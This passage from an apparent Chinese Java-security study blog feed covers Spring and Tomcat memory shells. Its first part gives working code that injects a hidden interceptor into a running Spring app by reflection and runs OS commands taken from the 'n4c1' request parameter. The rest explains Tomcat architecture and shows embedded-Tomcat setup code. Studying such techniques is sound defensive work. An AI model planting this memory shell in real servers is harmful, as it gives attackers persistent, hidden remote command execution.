<span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                Runtime.getRuntime().exec(cmd);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                n.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是反射获取再add进去<br>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.ContextLoader;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Controller</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicController</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span>  </span><br><span class="line">    <span class="meta">@ResponseBody</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;, defaultValue = &quot;unknown user&quot;)</span> String name)</span> &#123;  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context1</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();  </span><br><span class="line">        <span class="keyword">if</span> (context1 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context1.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context4</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">         <span class="keyword">if</span> (context4 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context4.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">AbstractHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> (AbstractHandlerMapping)context4.getBean(RequestMappingHandlerMapping.class);  </span><br><span class="line">         <span class="keyword">if</span> (handlerMapping != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(handlerMapping.getClass().getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">         <span class="keyword">try</span> &#123;  </span><br><span class="line">             <span class="type">Shell_Interceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Class</span> <span class="variable">abstractHandlerMappingClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMapping&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Field</span> <span class="variable">adaptedInterceptorsField</span> <span class="operator">=</span> abstractHandlerMappingClazz.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);  </span><br><span class="line">             adaptedInterceptorsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">             List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) adaptedInterceptorsField.get(handlerMapping);  </span><br><span class="line">             adaptedInterceptors.add(interceptor);  </span><br><span class="line">  </span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">             e.printStackTrace();  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;n4c1&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Runtime.getRuntime().exec(cmd);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                    n.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807232908.png" alt="image.png"></p><h3 id="Spring-WebFlux-框架"><a href="#Spring-WebFlux-框架" class="headerlink" title="Spring WebFlux 框架"></a>Spring WebFlux 框架</h3><p>[[Spring WebFlux 框架]]</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.cn/post/7214831216028745783#heading-4">https://juejin.cn/post/7214831216028745783#heading-4</a><br><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Spring架构原理-Spring内存马&quot;&gt;&lt;a href=&quot;#Spring架构原理-Spring内存马&quot; class=&quot;headerlink&quot; title=&quot;Spring架构原理 &amp;amp; Spring内存马&quot;&gt;&lt;/a&gt;Spring架构原理 &amp;amp; Spr</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="Spring内存马" scheme="http://example.com/tags/Spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 架构原理 &amp; Tomcat内存马</title>
    <link href="http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-10T06:38:59.000Z</published>
    <updated>2025-09-10T07:41:25.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-架构原理-Tomcat内存马"><a href="#Tomcat-架构原理-Tomcat内存马" class="headerlink" title="Tomcat 架构原理 &amp; Tomcat内存马"></a>Tomcat 架构原理 &amp; Tomcat内存马</h1><p>先阅读<br><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><strong>Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理</strong></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722011346.png" alt="image.png"></p><h3 id="连接器结构"><a href="#连接器结构" class="headerlink" title="连接器结构"></a>连接器结构</h3><p>连接器又分为两部分 &#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;<br>其中&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;负责与&#x3D;&#x3D;socket&#x3D;&#x3D;交互并将数据转换为其转换为&#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code>&#x3D;&#x3D;<br>由于这并不是标准的Servlet请求或响应, tomcat在设计时使用&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;来将  &#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code> &#x3D;&#x3D;转换为标准的&#x3D;&#x3D;<code>Servlet Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Servlet Respone</code>&#x3D;&#x3D;</p><h4 id="ProtocolHandler"><a href="#ProtocolHandler" class="headerlink" title="ProtocolHandler"></a><code>ProtocolHandler</code></h4><p>&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;又包含了&#x3D;&#x3D;<code>EndedPoint</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Processor</code>&#x3D;&#x3D;这两部分<br><code>EndPoint</code>是通信端点，即通信监听的接口，是具体的&#x3D;&#x3D;Socket &#x3D;&#x3D;接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234251.png" alt="image.png"></p><h5 id="EndPoint"><a href="#EndPoint" class="headerlink" title="EndPoint"></a><code>EndPoint</code></h5><p>&#x3D;&#x3D;<code>EndPoint</code>&#x3D;&#x3D;是通信端点，即&#x3D;&#x3D;通信监听的接口&#x3D;&#x3D;，是具体的 Socket 接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br>其工作流程如下图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722012456.png" alt="image.png"></p><h5 id="Proccessor"><a href="#Proccessor" class="headerlink" title="Proccessor"></a><code>Proccessor</code></h5><p>Processor 用来实现 HTTP 协议，Processor 接收来自 <code>EndPoint</code>的 <code>Socket</code>，读取字节流解析成 Tomcat <code>Request</code>和 <code>Response</code>对象，并通过 <code>Adapter</code>将其提交到容器处理，<code>Processor</code>是对应用层协议的抽象。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234159.png" alt="image.png"></p><h4 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h4><p>由于协议的不同，Tomcat 定义了自己的 <code>Request</code> 类来存放请求信息，这里其实体现了面向对象的思维。但是这个 Request 不是标准的 <code>ServletRequest</code> ，所以不能直接使用 Tomcat 定义 Request 作为参数直接容器。</p><p>Tomcat 设计者的解决方案是引入 <code>CoyoteAdapter</code>，这是适配器模式的经典运用，<code>Acceptor</code>监听连接生成 <code>SocketProcessor</code> 调用 <code>CoyoteAdapter</code> 的 <code>Sevice</code> 方法，传入的是 <code>Tomcat Request</code> 对象，<code>CoyoteAdapter</code>负责将 <code>Tomcat Request</code> 转成 <code>ServletRequest</code>，再调用容器的 <code>Service</code>方法</p><h3 id="Servlet容器结构"><a href="#Servlet容器结构" class="headerlink" title="Servlet容器结构"></a>Servlet容器结构</h3><p>具体结构如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720162109.png" alt="image.png"></p><p>一个 &#x3D;&#x3D;Service&#x3D;&#x3D; 只能有 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;, 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;可以管理多个站点(&#x3D;&#x3D;Host&#x3D;&#x3D;),  一个站点有多个&#x3D;&#x3D;<code>Context</code>&#x3D;&#x3D;(url路径), 一个context下可以有多个&#x3D;&#x3D;<code>servlet</code>&#x3D;&#x3D;, <code>Wrapper</code> 表示一个 <code>Servlet</code><br>为了方便, tomcat使用[[组合模式]]来管理只有一个具有父子关系地树形结构, 具体是: <strong>所有容器组件都实现了 <code>Container</code>接口，因此组合模式可以使得用户对单容器对象和组合容器对象的使用具有一致性</strong>。这里单容器对象指的是最底层的 <code>Wrapper</code>，组合容器对象指的是上面的 <code>Context</code>、<code>Host</code>或者 <code>Engine</code>。<code>Container</code> 接口定义如下：<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722013756.png" alt="image.png"></p><h5 id="Lifecycle-生命周期"><a href="#Lifecycle-生命周期" class="headerlink" title="Lifecycle 生命周期"></a>Lifecycle 生命周期</h5><p><code>Container</code>接口还继承了&#x3D;&#x3D;Lifecycle&#x3D;&#x3D;,Tomcat 就是通过 <code>Lifecycle</code> 统一管理所有容器的组件的&#x3D;&#x3D;生命周期&#x3D;&#x3D;。通过组合模式管理所有容器，拓展 <code>Lifecycle</code> 实现对每个组件的生命周期管理 ，<code>Lifecycle</code> 主要包含的方法&#x3D;&#x3D;<code>init()、start()、stop() 和 destroy()</code>&#x3D;&#x3D;。这样当一个<code>Context</code>, 其下面的wrapper也会被关闭</p><p>此外 因为各个组件<code>init()</code> 和 <code>start()</code> 方法的具体实现是复杂多变的，比如在 Host 容器的启动方法里需要扫描 webapps 目录下的 Web 应用，创建相应的 Context 容器,  如果下次有需要加入新的逻辑, 直接修改<code>init()</code> 和 <code>start()</code> 方法的话就会违背&#x3D;&#x3D;开闭原则&#x3D;&#x3D;, 因此tomcat采用[[观察者模式]]来解决这一问题<br>以下就是 <code>Lyfecycle</code> 接口的定义:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014620.png" alt="image.png"></p><p>此外 Tomcat 定义一个基类 &#x3D;&#x3D;<code>LifeCycleBase</code>&#x3D;&#x3D; 来实现<code> LifeCycle</code> 接口，把一些&#x3D;&#x3D;公共的逻辑&#x3D;&#x3D;放到基类中去，比如&#x3D;&#x3D;生命状态的转变与维护&#x3D;&#x3D;、&#x3D;&#x3D;生命事件的触发以及监听器的添加和删除&#x3D;&#x3D;等，而子类就负责实现自己的&#x3D;&#x3D;初始化&#x3D;&#x3D;、&#x3D;&#x3D;启动和停止等方法&#x3D;&#x3D;。<br>典型的&#x3D;&#x3D;抽象模板设计模式&#x3D;&#x3D;<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014824.png" alt="image.png"></p><p>总体设计图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722015102.png" alt="image.png"></p><h3 id="Tomcat启动流程"><a href="#Tomcat启动流程" class="headerlink" title="Tomcat启动流程"></a>Tomcat启动流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014956.png" alt="image.png"></p><ul><li>Tomcat 本生就是一个 Java 程序，所以 startup.sh 脚本就是启动一个 JVM 来运行 Tomcat 的启动类 Bootstrap。</li><li>Bootstrap 主要就是实例化 Catalina 和初始化 Tomcat 自定义的类加载器。热加载与热部署就是靠他实现。</li><li>Catalina: 解析 server.xml 创建 Server 组件，并且调用 Server.start() 方法。</li><li>Server：管理 Service 组件，调用 Service 的 start() 方法。</li><li>Service：主要职责就是管理顶层容器 Engine，分别调用 <code>Connector</code> 和 <code>Engine</code> 的 <code>start</code> 方法。</li></ul><h4 id="init流程"><a href="#init流程" class="headerlink" title="init流程"></a>init流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144446.png" alt="image.png"></p><h4 id="start流程"><a href="#start流程" class="headerlink" title="start流程"></a>start流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144529.png" alt="image.png"></p><h4 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h4><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span>        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;  </span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603  </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());  </span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);  </span><br><span class="line">        tomcat.start();  </span><br><span class="line">        tomcat.getServer().await();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);  </span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;Hello, World!&quot;</span>);  </span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了便于调试, 这里使用的是&#x3D;&#x3D;嵌入式的tomcat&#x3D;&#x3D;, 启动方式有所不同<br>嵌入式的启动是使用&#x3D;&#x3D;<code>org.apache.catalina.startup.Tomcat</code>&#x3D;&#x3D;类的一个简易启动, 而传统的启动则使用&#x3D;&#x3D;Catalina&#x3D;&#x3D;配合&#x3D;&#x3D;Bootstrap&#x3D;&#x3D;来完成启动的</p><ul><li><p><strong>嵌入式 Tomcat 启动：</strong> 使用 <code>Tomcat</code> 类的一个<strong>简易启动</strong>方式。</p><ul><li><code>Tomcat</code> 类作为高层 API，封装了底层 Catalina 组件的创建和配置细节，让开发者可以通过编程方式快速启动一个 Tomcat 实例。它在内部会隐式地创建和组装 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等核心组件。</li></ul></li><li><p><strong>传统 Tomcat 启动：</strong> 使用 <code>Catalina</code> 配合 <code>Bootstrap</code>。</p><ul><li><p><code>Bootstrap</code> 是<strong>引导程序</strong>，负责环境准备、类加载器设置，并调用 <code>Catalina</code> 的核心方法。</p></li><li><p><code>Catalina</code> 是<strong>核心容器的管理者</strong>，它根据 <code>server.xml</code> 等配置文件来解析、创建和协调 <code>Server</code>、<code>Service</code>、<code>Engine</code>、<code>Host</code> 等所有核心容器组件的生命周期。</p></li></ul></li></ul><p>先来看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  